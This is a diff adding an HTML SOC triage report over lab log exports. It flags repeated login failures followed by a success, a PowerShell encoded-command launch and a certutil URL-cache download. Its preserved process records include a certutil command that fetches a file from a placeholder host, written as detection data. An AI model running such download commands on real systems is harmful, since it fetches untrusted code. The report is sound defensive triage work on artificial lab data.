@@ -1,0 +1,159 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Executed exported-log triage report with source records, rejected inputs and analyst follow-up."><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'"><title>SOC triage handoff</title><style>body{font:16px/1.65 system-ui,sans-serif;color:#213533;max-width:860px;margin:40px auto;padding:0 22px}h1,h2,h3{line-height:1.25;overflow-wrap:anywhere}a{color:#286b60}section{margin-top:36px}li+li,details{margin-top:18px}pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#eef3f0;padding:16px}.status{padding:20px;border-left:4px solid #93651d;background:#fff8e9}summary{cursor:pointer}p{overflow-wrap:anywhere}</style></head><body><a class="skip-link" href="#main">Skip to content</a><main id="main">
+<h1>SOC triage handoff</h1><p class="status"><strong>PARTIAL / analyst review required</strong><br>input rows: 20 / accepted events: 13 / duplicate rows: 1 / rejected rows: 6 / review candidates: 3</p><p>Offline exported-log processing; review candidates, not confirmed incidents. No endpoint collection, network calls or response actions.</p><p>Rejected records remain below. A zero-candidate result does not establish that the input is complete or safe.</p>
+<nav aria-label="Report sections"><a href="#findings">Candidates</a> / <a href="#timeline">Timeline</a> / <a href="#sources">Sources</a> / <a href="#records">Input records</a></nav>
+<section id="findings"><h2>Review candidates</h2><ol><li><h3>AUTH_FAILURES_THEN_SUCCESS</h3><p>2026-10-26T10:10:00Z / lab_analyst / lab-wks-01</p><p>5 earlier failures within inclusive 600 seconds, then success on the same user/host/IP.</p><p><strong>Follow-up:</strong> Confirm account ownership, MFA context and approved activity before assigning incident severity.</p><p><a href="#S01:R000001">S01:R000001</a> <a href="#S01:R000002">S01:R000002</a> <a href="#S01:R000003">S01:R000003</a> <a href="#S01:R000007">S01:R000007</a> <a href="#S01:R000004">S01:R000004</a> <a href="#S01:R000005">S01:R000005</a> <a href="#S01:R000006">S01:R000006</a></p></li><li><h3>CERTUTIL_URLCACHE_FETCH</h3><p>2026-10-26T10:12:00Z / lab_analyst / lab-wks-01</p><p>certutil URL cache and force flags</p><p><strong>Follow-up:</strong> Validate command content, parent process and authorization; encoding alone does not establish malicious intent.</p><p><a href="#S02:R000002">S02:R000002</a></p></li><li><h3>PS_ENCODED_COMMAND</h3><p>2026-10-26T10:12:00Z / lab_analyst / lab-wks-01</p><p>PowerShell encoded-command argument</p><p><strong>Follow-up:</strong> Validate command content, parent process and authorization; encoding alone does not establish malicious intent.</p><p><a href="#S02:R000001">S02:R000001</a></p></li></ol></section><section id="timeline"><h2>Normalized UTC timeline</h2><ol><li><strong>2026-10-26T10:00:00Z</strong><p>login_failure / lab_analyst / lab-wks-01</p><a href="#S01:R000001">S01:R000001</a></li><li><strong>2026-10-26T10:00:00Z</strong><p>login_failure / lab_control / lab-wks-02</p><a href="#S01:R000008">S01:R000008</a></li><li><strong>2026-10-26T10:01:00Z</strong><p>login_failure / lab_analyst / lab-wks-01</p><a href="#S01:R000002">S01:R000002</a></li><li><strong>2026-10-26T10:01:00Z</strong><p>login_failure / lab_control / lab-wks-02</p><a href="#S01:R000009">S01:R000009</a></li><li><strong>2026-10-26T10:02:00Z</strong><p>login_failure / lab_analyst / lab-wks-01</p><a href="#S01:R000003">S01:R000003</a> <a href="#S01:R000007">S01:R000007</a></li><li><strong>2026-10-26T10:02:00Z</strong><p>login_success / lab_control / lab-wks-02</p><a href="#S01:R000010">S01:R000010</a></li><li><strong>2026-10-26T10:03:00Z</strong><p>login_failure / lab_analyst / lab-wks-01</p><a href="#S01:R000004">S01:R000004</a></li><li><strong>2026-10-26T10:04:00Z</strong><p>login_failure / lab_analyst / lab-wks-01</p><a href="#S01:R000005">S01:R000005</a></li><li><strong>2026-10-26T10:10:00Z</strong><p>login_success / lab_analyst / lab-wks-01</p><a href="#S01:R000006">S01:R000006</a></li><li><strong>2026-10-26T10:12:00Z</strong><p>process_start / lab_analyst / lab-wks-01</p><a href="#S02:R000001">S02:R000001</a></li><li><strong>2026-10-26T10:12:00Z</strong><p>process_start / lab_analyst / lab-wks-01</p><a href="#S02:R000002">S02:R000002</a></li><li><strong>2026-10-26T10:12:00Z</strong><p>process_start / lab_analyst / lab-wks-01</p><a href="#S02:R000003">S02:R000003</a></li><li><strong>2026-10-26T10:12:00Z</strong><p>process_start / lab_analyst / lab-wks-01</p><a href="#S02:R000004">S02:R000004</a></li></ol></section><section id="sources"><h2>Source files and scope</h2><ul><li>S01 / authentication.csv / 12 data records<pre>0099191c7dd9ab4395676b63b93b95de9ef28d4152b08e626ee0939f44efffae</pre></li><li>S02 / processes.json / 8 data records<pre>2461f8d3fa083458e7ddc5398a4dc12a119477970f8d2fb300b4b767f610702a</pre></li></ul><p>Same-time failures and successes do not establish order: tied failures are excluded and every success resets the earlier failure history.</p><p>Record references count CSV data records after the header or JSON array positions, starting at one. Record hashes cover canonical parsed JSON; file hashes cover exact input bytes. Only declared host/event_uid pairs are coalesced. Shared IDs must be stable and unique within a host across the supplied exports.</p></section><section id="records"><h2>Preserved input records</h2><details id="S01:R000001"><summary>S01:R000001 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a01&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:00:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: e7060b34de74c298dcf6976cfa9c736059a1c57aff635b026433e203240a0ec1</p></details><details id="S01:R000002"><summary>S01:R000002 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a02&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:01:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: c02815b2bf315775b4eaa24d820feaabb31494827fc4c4eadee7dcf0ba6151e4</p></details><details id="S01:R000003"><summary>S01:R000003 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a03&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:02:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: 7b8b966e6ecf6b34cd91e5b08b3e753e5ff64009c45674d0d2d190574c7a28d4</p></details><details id="S01:R000004"><summary>S01:R000004 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a04&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:03:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: a48cbbbec6f462269862266fbe85afb854b7a1049ccf0ca12f5cea77cda4a348</p></details><details id="S01:R000005"><summary>S01:R000005 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a05&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:04:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: c4a5288581fd7b95c75d14f9c838d546ef2bbe28125571b1646bac7c8aa93496</p></details><details id="S01:R000006"><summary>S01:R000006 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;a06&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T12:10:00+02:00&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_success&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: 834b601e3f2b247e6cc88141d50a69252b6c4a550174fc0205f2f98b31dc691e</p></details><details id="S01:R000007"><summary>S01:R000007 / duplicate</summary><p>S01:R000003</p><pre>{
+  &quot;event_uid&quot;: &quot;a03&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:02:00Z&quot;,
+  &quot;username&quot;: &quot;lab_analyst&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.10&quot;
+}</pre><p>Parsed-record SHA-256: 7b8b966e6ecf6b34cd91e5b08b3e753e5ff64009c45674d0d2d190574c7a28d4</p></details><details id="S01:R000008"><summary>S01:R000008 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;b01&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:00:00Z&quot;,
+  &quot;username&quot;: &quot;lab_control&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-02&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.20&quot;
+}</pre><p>Parsed-record SHA-256: 02a2cc1792cd1c291b9f9963361bd418551c84feafbffef55e80848efdd7a26a</p></details><details id="S01:R000009"><summary>S01:R000009 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;b02&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:01:00Z&quot;,
+  &quot;username&quot;: &quot;lab_control&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-02&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.20&quot;
+}</pre><p>Parsed-record SHA-256: b9401f469e3cfdfec33eccbaf8307d2cf90bb7b953306b34c43735fa6c620fe4</p></details><details id="S01:R000010"><summary>S01:R000010 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;event_uid&quot;: &quot;b03&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:02:00Z&quot;,
+  &quot;username&quot;: &quot;lab_control&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-02&quot;,
+  &quot;event_type&quot;: &quot;login_success&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.20&quot;
+}</pre><p>Parsed-record SHA-256: b1e54ef306d52face9dc44f759994ff690a172d7e6ea43db417d243120b3a3df</p></details><details id="S01:R000011"><summary>S01:R000011 / rejected</summary><p>Timestamp must include an explicit timezone</p><pre>{
+  &quot;event_uid&quot;: &quot;bad01&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:00:00&quot;,
+  &quot;username&quot;: &quot;lab_unknown&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-03&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;192.0.2.30&quot;
+}</pre><p>Parsed-record SHA-256: 5448dbfa3f744fbb5872b198bcbabee4b72545ff2851d0e8033e127edb2d8384</p></details><details id="S01:R000012"><summary>S01:R000012 / rejected</summary><p>&#x27;not-an-address&#x27; does not appear to be an IPv4 or IPv6 address</p><pre>{
+  &quot;event_uid&quot;: &quot;bad02&quot;,
+  &quot;timestamp&quot;: &quot;2026-10-26T10:00:00Z&quot;,
+  &quot;username&quot;: &quot;lab_unknown&quot;,
+  &quot;host&quot;: &quot;LAB-WKS-03&quot;,
+  &quot;event_type&quot;: &quot;login_failure&quot;,
+  &quot;source_ip&quot;: &quot;not-an-address&quot;
+}</pre><p>Parsed-record SHA-256: 3a10158361253889bc0cb20d94bdfcc2add24e1b1ea138df365c7cdc20d85951</p></details><details id="S02:R000001"><summary>S02:R000001 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;p01&quot;,
+  &quot;image&quot;: &quot;powershell.exe&quot;,
+  &quot;command_line&quot;: &quot;powershell.exe -EncodedCommand LAB_ONLY_PLACEHOLDER&quot;
+}</pre><p>Parsed-record SHA-256: 27de8176858f59646c1f6a1bc1f443cc6e7850893c68aee7e5bfbb918d8fe756</p></details><details id="S02:R000002"><summary>S02:R000002 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;p02&quot;,
+  &quot;image&quot;: &quot;certutil.exe&quot;,
+  &quot;command_line&quot;: &quot;certutil.exe -urlcache -f https://example.invalid/lab.bin lab.bin&quot;
+}</pre><p>Parsed-record SHA-256: f7b4d11a52b582c3bc566884d598f4205a9bfb957b5ce87efba6e92ebcec0857</p></details><details id="S02:R000003"><summary>S02:R000003 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;p03&quot;,
+  &quot;image&quot;: &quot;powershell.exe&quot;,
+  &quot;command_line&quot;: &quot;powershell.exe -File diagnostic.ps1&quot;
+}</pre><p>Parsed-record SHA-256: 5276a7c7236a55a2899c1b2f07f6b072b895b9f9ebe85d8d190047eed09946ac</p></details><details id="S02:R000004"><summary>S02:R000004 / accepted</summary><p>Accepted source record</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;p04&quot;,
+  &quot;image&quot;: &quot;certutil.exe&quot;,
+  &quot;command_line&quot;: &quot;certutil.exe -hashfile local.bin SHA256&quot;
+}</pre><p>Parsed-record SHA-256: 7a3135baab7c874a046ba4beddcc2fde559397ec252a625323f97d7255a84168</p></details><details id="S02:R000005"><summary>S02:R000005 / rejected</summary><p>Missing required field: command_line</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;bad03&quot;,
+  &quot;image&quot;: &quot;powershell.exe&quot;
+}</pre><p>Parsed-record SHA-256: af90b3d0e3df7f54e22013d717887528d8e5c68ac5f2001c762ca84265c4fc11</p></details><details id="S02:R000006"><summary>S02:R000006 / rejected</summary><p>Missing required field: host</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;bad04&quot;,
+  &quot;image&quot;: &quot;notepad.exe&quot;,
+  &quot;command_line&quot;: &quot;notepad.exe&quot;
+}</pre><p>Parsed-record SHA-256: 705491d43626456c0e5ca28ba7a3e24afeeab58e9b48a243c7e11a2b4eb7b068</p></details><details id="S02:R000007"><summary>S02:R000007 / rejected</summary><p>Conflicting or invalid copy of event_uid within host; all identifiable matching IDs quarantined</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;conflict01&quot;,
+  &quot;image&quot;: &quot;notepad.exe&quot;,
+  &quot;command_line&quot;: &quot;notepad.exe&quot;
+}</pre><p>Parsed-record SHA-256: 6e07c081f67c660f2b446072104394bbea27cd3eafe213149a3417d23e4748ce</p></details><details id="S02:R000008"><summary>S02:R000008 / rejected</summary><p>Conflicting or invalid copy of event_uid within host; all identifiable matching IDs quarantined</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-10-26T10:12:00Z&quot;,
+  &quot;user&quot;: &quot;lab_analyst&quot;,
+  &quot;computer&quot;: &quot;LAB-WKS-01&quot;,
+  &quot;action&quot;: &quot;process_start&quot;,
+  &quot;parent_image&quot;: &quot;explorer.exe&quot;,
+  &quot;event_uid&quot;: &quot;conflict01&quot;,
+  &quot;image&quot;: &quot;notepad.exe&quot;,
+  &quot;command_line&quot;: &quot;notepad.exe another.txt&quot;
+}</pre><p>Parsed-record SHA-256: 81aae7b38f6259f75af0a80a060b466509064b4a98de74741a01481b35e4b8ed</p></details></section></main></body></html>
